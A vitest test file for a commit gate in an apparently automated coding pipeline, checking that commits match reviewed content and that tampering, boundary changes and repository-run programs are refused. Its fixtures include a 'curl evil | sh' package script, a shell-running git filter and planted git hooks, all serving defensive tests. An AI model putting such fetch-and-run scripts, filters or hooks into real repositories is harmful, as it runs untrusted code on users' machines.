import { describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { chmodSync, existsSync, linkSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { GateApproval, Ledger, Manifest, Plan } from '@tecera/contracts';
import { MemoryLedger } from '@tecera/ledger';
import { testsReadOnlyFor } from './commitGate.js';
import { createGates, type CreateGatesOptions } from './index.js';
import { memLedger, ctx, FakeReviewer, FakeRunner, grant, LEDGERS, LOOP, makeRepo, manifest, NOW, plan, WRITERS, type Repo } from './testkit/fixtures.js';

interface Setup {
  repo: Repo;
  ledger: Ledger;
  gates: ReturnType<typeof createGates>;
  clock: { t: number };
  d1: string;
  d2: string;
  p: Plan;
  commitCtx(approval?: GateApproval, o?: { attempt?: number; candidate?: { d1?: string; d2?: string } }): ReturnType<typeof ctx>;
  fresh(extra?: Partial<CreateGatesOptions>): ReturnType<typeof createGates>;
}

async function prepared(opts: { ledger?: Ledger; change?: (r: Repo) => void; m?: Manifest; p?: Plan; extra?: Partial<CreateGatesOptions>; expectApprove?: boolean } = {}): Promise<Setup> {
  const repo = makeRepo();
  (opts.change ?? ((r) => r.write('src/a.ts', 'export const a = 2;\n')))(repo);
  const ledger = opts.ledger ?? memLedger();
  const clock = { t: NOW };
  const p = opts.p ?? plan();
  const make = (extra: Partial<CreateGatesOptions> = {}) =>
    createGates({
      manifest: opts.m ?? manifest(),
      ledger,
      verifyRunner: new FakeRunner(),
      reviewer: new FakeReviewer('openai'),
      writers: WRITERS,
      worktree: repo.dir,
      now: () => clock.t,
      sessionId: 's1',
      ...opts.extra,
      ...extra,
    });
  const gates = make();
  const v = await gates.verify(ctx('v', { worktree: repo.dir, plan: p }));
  const r = await gates.review(ctx('r', { worktree: repo.dir, plan: p, candidate: { d1: v.fingerprint } }));
  if (opts.expectApprove !== false) {
    expect(v.exitCode).toBe(0);
    expect(r.verdict).toBe('approve');
  }
  const s: Setup = {
    repo,
    ledger,
    gates,
    clock,
    d1: v.fingerprint,
    d2: r.fingerprint ?? '',
    p,
    commitCtx: (approval, o = {}) => ctx('c', { worktree: repo.dir, plan: p, attempt: o.attempt, candidate: o.candidate ?? { d1: s.d1, d2: s.d2 }, ...(approval ? { approval } : {}) }),
    fresh: make,
  };
  return s;
}

const onMain = (r: Repo) => expect(r.g('rev-parse', '--abbrev-ref', 'HEAD').trim()).toBe('main');
const noBranch = (r: Repo) => expect(() => r.g('rev-parse', '--verify', '--quiet', 'refs/heads/tecera/g1')).toThrow();
const commitsOnBranch = (r: Repo) => Number(r.g('rev-list', '--count', 'main..tecera/g1').trim());

/**
 * Pretend the review approved D1 even when the real reviewer refused (a compromised or older review): the
 * commit gate's own classification, boundary and tamper checks must still refuse on their own.
 */
function forceApprove(s: Setup): void {
  const rv = s.gates.memo.review.get('run1:i1')!;
  if (rv.verdict === 'approve') return;
  s.gates.memo.review.set('run1:i1', { ...rv, verdict: 'approve', d1: s.d1, d2: s.d1, files: s.gates.memo.verify.get('run1:i1')!.files });
  s.d2 = s.d1;
}

function marker(): string {
  return join(mkdtempSync(join(tmpdir(), 'tecera-mark-')), 'ran');
}

describe('CommitGate happy path', () => {
  it('commits the reviewed bytes on the work branch with plumbing, WITHOUT any approval (D6)', async () => {
    const s = await prepared({ change: (r) => (r.write('src/a.ts', 'export const a = 2;\n'), r.write('src/b.ts', 'export const b = 1;\n')) });
    const r = await s.gates.commit(s.commitCtx());
    expect(r).toMatchObject({ exitCode: 0, terminal: false });
    expect(r.sha).toMatch(/^[0-9a-f]{40}$/);
    expect(s.repo.g('rev-parse', '--abbrev-ref', 'HEAD').trim()).toBe('tecera/g1');
    expect(s.repo.g('rev-parse', 'tecera/g1').trim()).toBe(r.sha);
    expect(s.repo.g('rev-parse', 'HEAD^').trim()).toBe(s.repo.g('rev-parse', 'main').trim());
    // the base branch never moves: the commit lands on the work branch only
    expect(s.repo.g('rev-parse', 'main').trim()).not.toBe(r.sha);
    expect(s.repo.g('show', '--name-only', '--format=', 'HEAD').trim().split('\n').sort()).toEqual(['src/a.ts', 'src/b.ts']);
    expect(s.repo.g('cat-file', 'blob', 'HEAD:src/a.ts')).toBe('export const a = 2;\n');
    expect(s.repo.g('log', '-1', '--format=%B')).not.toMatch(/Tecera-Approval/);
    expect(s.repo.g('status', '--porcelain').trim()).toBe('');
    const ev = (await s.ledger.getEvidence(r.evidenceKey))!.body as Record<string, any>;
    expect(r.evidenceKey).toBe('commit:run1:i1:c:0');
    expect(ev).toMatchObject({ outcome: 'committed', sha: r.sha, branch: 'tecera/g1', reconciled: false, approvalIgnored: null });
    expect(ev.tree).toBe(s.repo.g('rev-parse', 'HEAD^{tree}').trim());
    expect(ev.fingerprints).toEqual({ d1: s.d1, d2: s.d1, d3: s.d1 });
    const intent = (await s.ledger.getEvidence('commit-intent:run1:i1:c:0'))!.body as Record<string, any>;
    expect(intent).toMatchObject({ expectedTree: ev.tree, branch: 'tecera/g1' });
    expect(intent.approval).toBeUndefined();
  });

  it('a grant handed to gate.commit is ignored, never consumed (the PR gate is the approval point)', async () => {
    const s = await prepared();
    const ap = await grant(s.ledger, { d1: s.d1 });
    const r = await s.gates.commit(s.commitCtx(ap));
    expect(r.exitCode).toBe(0);
    expect((await s.ledger.getApproval!('ap1'))!.state).toBe('granted');
    expect((await s.ledger.getEvidence(r.evidenceKey))!.body).toMatchObject({ approvalIgnored: 'ap1' });
  });

  it('a second call for the same step and attempt returns the recorded commit (no second commit)', async () => {
    const s = await prepared();
    const a = await s.gates.commit(s.commitCtx());
    const b = await s.gates.commit(s.commitCtx());
    expect(b).toMatchObject({ exitCode: 0, sha: a.sha, reconciled: true });
    expect(commitsOnBranch(s.repo)).toBe(1);
  });

  it('digests are recovered from the ledger after a restart (fresh memo, loop events)', async () => {
    const s = await prepared();
    const v = s.gates.memo.verify.get('run1:i1')!;
    const rv = s.gates.memo.review.get('run1:i1')!;
    const { event } = await import('@tecera/contracts');
    const trace = (stepId: string) => ({ goalId: 'g1', intentionId: 'i1', stepId });
    await s.ledger.append(event('verify.passed', { id: 'e1', at: NOW, actor: LOOP, runId: 'run1', trace: trace('v'), payload: { exitCode: 0, evidenceKey: v.evidenceKey } }));
    await s.ledger.append(event('review.passed', { id: 'e2', at: NOW, actor: LOOP, runId: 'run1', trace: trace('r'), payload: { verdict: 'approve', evidenceKey: rv.evidenceKey } }));
    expect((await s.fresh().commit(s.commitCtx())).exitCode).toBe(0);
  });
});

describe('CommitGate never runs repository programs', () => {
  it('a hostile clean filter in local config never runs; the commit is refused (9, terminal)', async () => {
    const s = await prepared();
    const m = marker();
    s.repo.write('.gitattributes', '');
    s.repo.g('config', 'filter.evil.clean', `sh -c 'echo ran > ${m}; cat'`);
    s.repo.g('config', 'filter.evil.smudge', `sh -c 'echo ran > ${m}; cat'`);
    const r = await s.gates.commit(s.commitCtx());
    expect(r).toMatchObject({ exitCode: 9, reason: 'unsafe-repo', terminal: true });
    expect(existsSync(m)).toBe(false);
    noBranch(s.repo);
  });

  it('a local core.hooksPath is refused; default .git/hooks never run under the gate', async () => {
    const m = marker();
    const hook = `#!/bin/sh\necho ran >> ${m}\n`;
    const s = await prepared({
      change: (r) => {
        for (const h of ['pre-commit', 'commit-msg', 'post-commit', 'post-checkout', 'prepare-commit-msg', 'reference-transaction']) {
          r.write(`.git/hooks/${h}`, hook);
          chmodSync(join(r.dir, `.git/hooks/${h}`), 0o755);
        }
        r.write('src/a.ts', 'export const a = 2;\n');
      },
    });
    expect((await s.gates.commit(s.commitCtx())).exitCode).toBe(0);
    expect(existsSync(m)).toBe(false);
    // Sanity: the planted hook does run under a plain git commit.
    s.repo.write('src/c.ts', 'x\n');
    s.repo.g('add', 'src/c.ts');
    s.repo.g('commit', '-q', '-m', 'plain');
    expect(existsSync(m)).toBe(true);

    const t = await prepared();
    t.repo.g('config', 'core.hooksPath', '.husky');
    expect(await t.gates.commit(t.commitCtx())).toMatchObject({ exitCode: 9, reason: 'unsafe-repo' });
  });

  it('.gitattributes with a filter attribute in the candidate is refused before review even runs', async () => {
    const s = await prepared({ change: (r) => (r.write('src/a.ts', 'export const a = 2;\n'), r.write('src/.gitattributes', '*.ts filter=lfs\n')), expectApprove: false });
    const r = await s.gates.commit(s.commitCtx());
    expect(r.exitCode).toBe(9);
    noBranch(s.repo);
  });
});

describe('CommitGate binds the commit to the reviewed bytes → 9', () => {
  it('late mutation of an allowed file after review (D3 != D2): 9, grant untouched, nothing committed', async () => {
    const s = await prepared();
    s.repo.write('src/a.ts', 'export const a = 3;\n');
    const r = await s.gates.commit(s.commitCtx());
    expect(r).toMatchObject({ exitCode: 9, reason: 'digest-drift', terminal: true });
    noBranch(s.repo);
    // Back to the reviewed bytes: the same grant now commits exactly those bytes.
    s.repo.write('src/a.ts', 'export const a = 2;\n');
    expect((await s.gates.commit(s.commitCtx())).exitCode).toBe(0);
    expect(s.repo.g('cat-file', 'blob', 'HEAD:src/a.ts')).toBe('export const a = 2;\n');
  });

  it('mutation while the gate stages (after D3, before commit): 9 and nothing committed, grant untouched', async () => {
    let dir = '';
    const s = await prepared({ extra: { commitTestHooks: { afterStage: () => writeFileSync(join(dir, 'src/a.ts'), 'export const a = 666;\n') } } });
    dir = s.repo.dir;
    const r = await s.gates.commit(s.commitCtx());
    expect(r).toMatchObject({ exitCode: 9, reason: 'digest-drift-before-commit' });
    noBranch(s.repo);
  });

  it('the per-file content record is compared, not just names: a doctored verify record is 9', async () => {
    const s = await prepared();
    const v = s.gates.memo.verify.get('run1:i1')!;
    const files = (v.files as Array<Record<string, unknown>>).map((f) => ({ ...f, sha256: '0'.repeat(64) }));
    s.gates.memo.verify.set('run1:i1', { ...v, files });
    expect(await s.gates.commit(s.commitCtx())).toMatchObject({ exitCode: 9, reason: 'content-mismatch' });
  });

  it('GateContext candidate fingerprints that differ from evidence are 9', async () => {
    const s = await prepared();
    expect(await s.gates.commit(s.commitCtx(undefined, { candidate: { d1: 'f'.repeat(64), d2: s.d2 } }))).toMatchObject({ exitCode: 9, reason: 'verify-digest-mismatch' });
    expect(await s.gates.commit(s.commitCtx(undefined, { candidate: { d1: s.d1, d2: 'f'.repeat(64) } }))).toMatchObject({ exitCode: 9, reason: 'review-digest-mismatch' });
  });

  it('verify ran on a different tree than review → 9; no review → 9; rejected review → 8', async () => {
    const s = await prepared();
    const v = s.gates.memo.verify.get('run1:i1')!;
    s.gates.memo.verify.set('run1:i1', { ...v, fingerprint: 'other' });
    expect(await s.gates.commit(s.commitCtx(undefined, { candidate: {} }))).toMatchObject({ exitCode: 9, reason: 'digest-drift' });

    const repo = makeRepo();
    repo.write('src/a.ts', 'export const a = 2;\n');
    const ledger = memLedger();
    const g = createGates({ manifest: manifest(), ledger, verifyRunner: new FakeRunner(), reviewer: new FakeReviewer('openai', () => '{"verdict":"reject","findings":[{"title":"no"}]}'), writers: WRITERS, worktree: repo.dir, now: () => NOW, sessionId: 's1' });
    const c = ctx('c', { worktree: repo.dir });
    expect(await g.commit(c)).toMatchObject({ exitCode: 9, reason: 'no-reviewed-digest' });
    await g.verify(ctx('v', { worktree: repo.dir }));
    await g.review(ctx('r', { worktree: repo.dir }));
    expect(await g.commit(c)).toMatchObject({ exitCode: 8, reason: 'review-not-approved' });
  });

  it("refuses '' and foreign worktrees, and HEAD away from base", async () => {
    const s = await prepared();
    expect(await s.gates.commit({ ...s.commitCtx(), worktree: '' })).toMatchObject({ exitCode: 9, reason: 'no-worktree', terminal: true });
    expect(await s.gates.commit({ ...s.commitCtx(), worktree: '/tmp/elsewhere' })).toMatchObject({ exitCode: 9, reason: 'no-worktree' });
    s.repo.g('checkout', '-q', '-b', 'side');
    s.repo.g('commit', '-q', '--allow-empty', '-m', 'side');
    expect(await s.gates.commit(s.commitCtx())).toMatchObject({ exitCode: 9, reason: 'head-not-base' });
  });
});

describe('CommitGate classification, tamper and boundary → exit 8', () => {
  const allowPkg = manifest({ repo: { base: 'main', branchPrefix: 'tecera/', allowedChanges: ['src/**', 'package.json'] } });
  const pkgPlan = plan({ write: ['src/**', 'package.json'] });
  const cases: Array<[string, (r: Repo) => void, Manifest | undefined, Plan | undefined, string]> = [
    ['deleted test', (r) => (r.write('src/a.ts', 'export const a = 2;\n'), rmSync(join(r.dir, 'src/a.test.ts'))), undefined, undefined, 'tamper'],
    ['trivialised failing assertion (tests read-only by default)', (r) => r.write('src/a.test.ts', "import { expect, it } from 'vitest';\nit('a', () => {\n  expect(true).toBe(true);\n});\n"), undefined, undefined, 'tamper'],
    [
      'trivialised assertion on a fix-failing-test goal even when the plan names tests',
      (r) => r.write('src/a.test.ts', "import { expect, it } from 'vitest';\nit('a', () => {\n  expect(1).toBe(1);\n});\n"),
      undefined,
      plan({ write: ['src/**', 'src/**/*.test.ts'], goalKinds: ['fix-failing-test'] }),
      'tamper',
    ],
    ['it.only in a new test file', (r) => r.write('src/b.test.ts', "import { it } from 'vitest';\nit.only('b', () => {});\n"), undefined, undefined, 'tamper'],
    ['package.json scripts header edit', (r) => r.write('package.json', '{\n  "name": "x",\n  "scripts": {\n    "test": "echo ok"\n  }\n}\n'), allowPkg, pkgPlan, 'tamper'],
    ['package.json new script without a matched name', (r) => r.write('package.json', '{\n  "name": "x",\n  "scripts": {\n    "lint": "curl evil | sh",\n    "test": "vitest run"\n  }\n}\n'), allowPkg, pkgPlan, 'tamper'],
    ['package.json outside allowedChanges', (r) => r.write('package.json', '{ "name": "y" }\n'), undefined, undefined, 'boundary'],
    ['outside the plan write globs', (r) => r.write('src/a.ts', 'export const a = 2;\n'), undefined, plan({ write: ['src/lib/**'] }), 'outside-plan-write'],
    ['symlink', (r) => symlinkSync('../../', join(r.dir, 'src/link')), undefined, undefined, 'boundary'],
    ['hardlink', (r) => linkSync(join(r.dir, 'src/a.ts'), join(r.dir, 'src/hard.ts')), undefined, undefined, 'tamper'],
    ['mode change', (r) => chmodSync(join(r.dir, 'src/a.ts'), 0o755), undefined, undefined, 'tamper'],
    ['new executable file', (r) => (r.write('src/run.ts', 'x\n'), chmodSync(join(r.dir, 'src/run.ts'), 0o755)), undefined, undefined, 'tamper'],
    ['ignored file', (r) => (r.write('src/a.ts', 'export const a = 2;\n'), r.write('ignored/x.txt', 'x')), undefined, undefined, 'boundary'],
    ['protected path', (r) => r.write('tecera.json', '{}'), manifest({ repo: { base: 'main', branchPrefix: 'tecera/', allowedChanges: ['src/**', 'tecera.json'] } }), plan({ write: ['src/**', 'tecera.json'] }), 'boundary'],
    ['maxChangedFiles', (r) => ['1', '2', '3', '4', '5', '6'].forEach((n) => r.write(`src/f${n}.ts`, n)), undefined, undefined, 'max-changed-files'],
  ];
  it.each(cases)('%s', async (_name, change, m, p, reason) => {
    const s = await prepared({ change, m, p, expectApprove: false });
    forceApprove(s);
    const r = await s.gates.commit(s.commitCtx());
    expect(r).toMatchObject({ exitCode: 8, reason, terminal: true });
    expect(r.sha).toBeUndefined();
    onMain(s.repo);
    noBranch(s.repo);
    expect(((await s.ledger.getEvidence(r.evidenceKey))!.body as { exitCode: number }).exitCode).toBe(8);
  });

  it('a small untracked binary is refused (8) even if a reviewer had approved the tree', async () => {
    const s = await prepared({ change: (r) => (r.write('src/a.ts', 'export const a = 2;\n'), r.write('src/x.dat', Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x00, 0x01]))), expectApprove: false });
    // The real reviewer refused the incomplete packet; pretend an approval anyway (compromised/older review).
    const rv = s.gates.memo.review.get('run1:i1')!;
    expect((await s.ledger.getEvidence(rv.evidenceKey))!.body).toMatchObject({ reason: 'incomplete-packet' });
    forceApprove(s);
    expect(await s.gates.commit(s.commitCtx(undefined, { candidate: { d1: s.d1, d2: s.d1 } }))).toMatchObject({ exitCode: 8, reason: 'binary' });
    noBranch(s.repo);
  });

  it('invalid UTF-8 text is classified binary (8)', async () => {
    const s = await prepared({ change: (r) => r.write('src/a.ts', Buffer.from([0x63, 0xff, 0x0a])), expectApprove: false });
    forceApprove(s);
    expect(await s.gates.commit(s.commitCtx(undefined, { candidate: { d1: s.d1, d2: s.d1 } }))).toMatchObject({ exitCode: 8, reason: 'binary' });
  });

  it('test edits are allowed only when the plan names tests explicitly and the goal is not fix-failing-test', async () => {
    const p = plan({ write: ['src/**', 'src/**/*.test.ts'], goalKinds: ['feature'] });
    expect(testsReadOnlyFor({ goal: ctx('c').goal, plan: p })).toBe(false);
    expect(testsReadOnlyFor({ goal: ctx('c').goal, plan: p }, true)).toBe(true);
    expect(testsReadOnlyFor({ goal: ctx('c').goal, plan: plan() })).toBe(true);
    expect(testsReadOnlyFor({ goal: { ...ctx('c').goal, id: 'fix-failing-test-42' }, plan: p })).toBe(true);
    const s = await prepared({ change: (r) => r.write('src/a.test.ts', "import { it } from 'vitest';\nit('a', () => {});\n"), p });
    expect((await s.gates.commit(s.commitCtx())).exitCode).toBe(0);
  });

  it('pre-existing ignored files recorded by the baseline do not block the commit; changed ones do', async () => {
    const repo = makeRepo();
    repo.write('ignored/dep.js', 'module.exports = 1;\n');
    const ledger = memLedger();
    const g = createGates({ manifest: manifest(), ledger, verifyRunner: new FakeRunner(), reviewer: new FakeReviewer('openai'), writers: WRITERS, worktree: repo.dir, now: () => NOW, sessionId: 's1' });
    expect((await g.baseline({ runId: 'run1' })).exitCode).toBe(0);
    repo.write('src/a.ts', 'export const a = 2;\n');
    const v = await g.verify(ctx('v', { worktree: repo.dir }));
    await g.review(ctx('r', { worktree: repo.dir }));
    expect((await g.commit(ctx('c', { worktree: repo.dir }))).exitCode).toBe(0);
  });
});

describe.each(LEDGERS)('CommitGate without approvals (%s)', (_name, mk) => {
  it('commits with this ledger and no approval anywhere; the manifest cannot require one for commit', async () => {
    const s = await prepared({ ledger: mk() });
    expect(s.commitCtx().approval).toBeUndefined();
    expect((await s.gates.commit(s.commitCtx())).exitCode).toBe(0);
    expect(() => manifest({ policy: { ...manifest().policy, approvals: { required: ['commit'], ttlSec: 900, quorum: 1, separationOfDuty: true } } } as never)).toThrow(/commit/);
  });

  it('concurrent commits of the same step produce exactly one commit (the intent claim)', async () => {
    const s = await prepared({ ledger: mk() });
    const other = s.fresh();
    other.memo.verify.set('run1:i1', s.gates.memo.verify.get('run1:i1')!);
    other.memo.review.set('run1:i1', s.gates.memo.review.get('run1:i1')!);
    const results = await Promise.all([s.gates.commit(s.commitCtx()), other.commit(s.commitCtx())]);
    const ok = results.filter((r) => r.exitCode === 0);
    expect(ok.length).toBeGreaterThanOrEqual(1);
    expect(new Set(ok.map((r) => r.sha)).size).toBe(1);
    for (const r of results) if (r.exitCode !== 0) expect(r.terminal).toBe(true);
    expect(commitsOnBranch(s.repo)).toBe(1);
  });

  it('S8: crash after the ref moved, before the record → restart reconciles to the same commit', async () => {
    const s = await prepared({ ledger: mk(), extra: { commitTestHooks: { afterRef: () => Promise.reject(new Error('crash')) } } });
    await expect(s.gates.commit(s.commitCtx())).rejects.toThrow('crash');
    const sha = s.repo.g('rev-parse', 'tecera/g1').trim();
    const restarted = s.fresh({ commitTestHooks: {} });
    const r = await restarted.commit(s.commitCtx());
    expect(r).toMatchObject({ exitCode: 0, sha, reconciled: true });
    expect(commitsOnBranch(s.repo)).toBe(1);
    expect((await s.ledger.getEvidence(r.evidenceKey))!.body).toMatchObject({ outcome: 'committed', reconciled: true, sha });
  });

  it('S8: crash after update-ref but before HEAD moved → reconcile finishes HEAD and records', async () => {
    let dir = '';
    const s = await prepared({
      ledger: mk(),
      extra: {
        commitTestHooks: {
          afterRef: () => {
            // Undo the HEAD move to simulate the crash window between update-ref and symbolic-ref.
            makeRepoGit(dir)('symbolic-ref', 'HEAD', 'refs/heads/main');
            makeRepoGit(dir)('read-tree', 'main');
            throw new Error('crash');
          },
        },
      },
    });
    dir = s.repo.dir;
    await expect(s.gates.commit(s.commitCtx())).rejects.toThrow('crash');
    onMain(s.repo);
    const r = await s.fresh({ commitTestHooks: {} }).reconcile(s.commitCtx());
    expect(r).toMatchObject({ exitCode: 0, reconciled: true });
    expect(s.repo.g('rev-parse', '--abbrev-ref', 'HEAD').trim()).toBe('tecera/g1');
  });

  it('S8: crash after the intent but before commit-tree → reconcile says human (9), never commits', async () => {
    const s = await prepared({ ledger: mk(), extra: { commitTestHooks: { beforeCommit: () => Promise.reject(new Error('crash')) } } });
    await expect(s.gates.commit(s.commitCtx())).rejects.toThrow('crash');
    const r = await s.fresh({ commitTestHooks: {} }).commit(s.commitCtx());
    expect(r).toMatchObject({ exitCode: 9, reason: 'reconcile-no-commit', terminal: true });
    noBranch(s.repo);
  });

  it('S8: ledger failure writing the final record after commit → the retry reconciles', async () => {
    const ledger = mk();
    const orig = ledger.evidence.bind(ledger);
    let failFinal = true;
    ledger.evidence = async (e) => {
      if (failFinal && e.key.startsWith('commit:')) throw new Error('ledger down');
      return orig(e);
    };
    const s = await prepared({ ledger });
    await expect(s.gates.commit(s.commitCtx())).rejects.toThrow('ledger down');
    failFinal = false;
    const r = await s.fresh().commit(s.commitCtx());
    expect(r).toMatchObject({ exitCode: 0, reconciled: true, sha: s.repo.g('rev-parse', 'tecera/g1').trim() });
  });

  it('S8: an intent recorded under this key for another action is refused (9), never reused', async () => {
    const s = await prepared({ ledger: mk() });
    await s.ledger.evidence({ key: 'commit-intent:run1:i1:c:0', kind: 'gate.commit.intent', runId: 'run1', body: { expectedTree: 'a'.repeat(40), parent: 'b'.repeat(40), branch: 'tecera/g1', intentionId: 'i9', stepId: 'c', attempt: 0 } });
    const r = await s.gates.commit(s.commitCtx());
    expect(r).toMatchObject({ exitCode: 9, reason: 'reconcile-action-mismatch' });
    noBranch(s.repo);
  });
});

describe('CommitGate evidence is redacted', () => {
  it('tamper detail with a secret and the goal statement never reach the ledger or the commit message raw', async () => {
    const secret = 'TECERA_CANARY_commit_gate_1';
    const s = await prepared({ change: (r) => r.write('src/b.test.ts', `import { it } from 'vitest';\nit.only('${secret}', () => {});\n`), expectApprove: false });
    const r = await s.gates.commit(s.commitCtx());
    expect(r.exitCode).toBe(8);
    const body = JSON.stringify((await s.ledger.getEvidence(r.evidenceKey))!.body);
    expect(body).toContain('focus-or-skip');
    expect(body).not.toContain(secret);
  });
});

function makeRepoGit(dir: string) {
  return (...args: string[]) => {
    return execFileSync('git', ['-C', dir, ...args], { env: { PATH: process.env.PATH, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_SYSTEM: '/dev/null' }, encoding: 'utf8' });
  };
}

describe('CommitGate: a deleted baselined ignored file is a boundary change (wave 3, N2)', () => {
  async function baselined(o: { fresh?: boolean } = {}) {
    const repo = makeRepo();
    repo.write('ignored/dep.js', 'module.exports = 1;\n');
    repo.write('ignored/keep.js', 'module.exports = 2;\n');
    const ledger = memLedger();
    const mk = () => createGates({ manifest: manifest(), ledger, verifyRunner: new FakeRunner(), reviewer: new FakeReviewer('openai'), writers: WRITERS, worktree: repo.dir, now: () => NOW, sessionId: 's1' });
    const first = mk();
    expect((await first.baseline({ runId: 'run1' })).exitCode).toBe(0);
    // A fresh instance (restart) must recover the same baseline from the ledger alone.
    const g = o.fresh ? mk() : first;
    return { repo, ledger, g };
  }

  for (const fresh of [false, true]) {
    it(`deleted after the baseline, before verify → verify/review agree, commit refuses 8 (boundary)${fresh ? ' [fresh instance]' : ''}`, async () => {
      const { repo, ledger, g } = await baselined({ fresh });
      repo.write('src/a.ts', 'export const a = 2;\n');
      rmSync(join(repo.dir, 'ignored/dep.js'));
      const v = await g.verify(ctx('v', { worktree: repo.dir }));
      expect(v.exitCode).toBe(0);
      const verifyFiles = (await ledger.getEvidence(v.evidenceKey))!.body as { files: Array<Record<string, unknown>> };
      expect(verifyFiles.files).toContainEqual(expect.objectContaining({ path: 'ignored/dep.js', status: '!', deleted: true }));
      const r = await g.review(ctx('r', { worktree: repo.dir, candidate: { d1: v.fingerprint } }));
      expect(r.verdict).toBe('approve');
      const c = await g.commit(ctx('c', { worktree: repo.dir, candidate: { d1: v.fingerprint, d2: r.fingerprint } }));
      expect(c).toMatchObject({ exitCode: 8, reason: 'boundary', terminal: true });
      expect(JSON.stringify((await ledger.getEvidence(c.evidenceKey))!.body)).toMatch(/ignored file changed: ignored\/dep\.js/);
      noBranch(repo);
    });
  }

  it('deleted between review and commit → D3 differs from D1/D2 → 9 (digest-drift), nothing committed', async () => {
    const { repo, ledger, g } = await baselined();
    repo.write('src/a.ts', 'export const a = 2;\n');
    const v = await g.verify(ctx('v', { worktree: repo.dir }));
    const r = await g.review(ctx('r', { worktree: repo.dir, candidate: { d1: v.fingerprint } }));
    rmSync(join(repo.dir, 'ignored/keep.js'));
    const c = await g.commit(ctx('c', { worktree: repo.dir, candidate: { d1: v.fingerprint, d2: r.fingerprint } }));
    expect(c).toMatchObject({ exitCode: 9, terminal: true });
    noBranch(repo);
  });

  it('deleted by the verify command itself → mutated (9)', async () => {
    const repo = makeRepo();
    repo.write('ignored/dep.js', 'module.exports = 1;\n');
    const ledger = memLedger();
    const runner = new FakeRunner(() => (rmSync(join(repo.dir, 'ignored/dep.js')), {}));
    const g = createGates({ manifest: manifest(), ledger, verifyRunner: new FakeRunner(), reviewer: new FakeReviewer('openai'), writers: WRITERS, worktree: repo.dir, now: () => NOW, sessionId: 's1' });
    await g.baseline({ runId: 'run1' });
    repo.write('src/a.ts', 'export const a = 2;\n');
    const g2 = createGates({ manifest: manifest(), ledger, verifyRunner: runner, reviewer: new FakeReviewer('openai'), writers: WRITERS, worktree: repo.dir, now: () => NOW, sessionId: 's1' });
    expect(await g2.verify(ctx('v', { worktree: repo.dir }))).toMatchObject({ exitCode: 9, outcome: 'mutated' });
  });

  it('unchanged baseline files across a restart still commit (redacted names do not break the lookup)', async () => {
    const { repo, ledger, g } = await baselined({ fresh: true });
    repo.write('src/a.ts', 'export const a = 2;\n');
    const v = await g.verify(ctx('v', { worktree: repo.dir }));
    const r = await g.review(ctx('r', { worktree: repo.dir, candidate: { d1: v.fingerprint } }));
    expect((await g.commit(ctx('c', { worktree: repo.dir, candidate: { d1: v.fingerprint, d2: r.fingerprint } }))).exitCode).toBe(0);
  });
});

describe('CommitGate: the passing verify must have run the goal check (wave 3)', () => {
  it('a verify that ran another command than the GateContext goal check is refused (9, verify-check-mismatch)', async () => {
    const s = await prepared();
    const c = s.commitCtx();
    const r = await s.gates.commit({ ...c, goal: { ...c.goal, check: { command: 'node --test other-suite', timeoutSec: 60 } } });
    expect(r).toMatchObject({ exitCode: 9, reason: 'verify-check-mismatch', terminal: true });
    noBranch(s.repo);
  });

  it('verify evidence without a command digest (older evidence) is refused, not trusted', async () => {
    const s = await prepared();
    const v = s.gates.memo.verify.get('run1:i1')!;
    s.gates.memo.verify.set('run1:i1', { evidenceKey: v.evidenceKey, fingerprint: v.fingerprint, outcome: v.outcome, files: v.files });
    expect(await s.gates.commit(s.commitCtx())).toMatchObject({ exitCode: 9, reason: 'verify-check-mismatch' });
  });

  it('a truncated passing run cannot be committed: verify reports failed, commit refuses (8, verify-not-passed)', async () => {
    const s = await prepared({ extra: { verifyRunner: new FakeRunner(() => ({ exitCode: 0, truncated: true })) }, expectApprove: false });
    expect(await s.gates.commit(s.commitCtx())).toMatchObject({ exitCode: 8, reason: 'verify-not-passed' });
    noBranch(s.repo);
  });
});
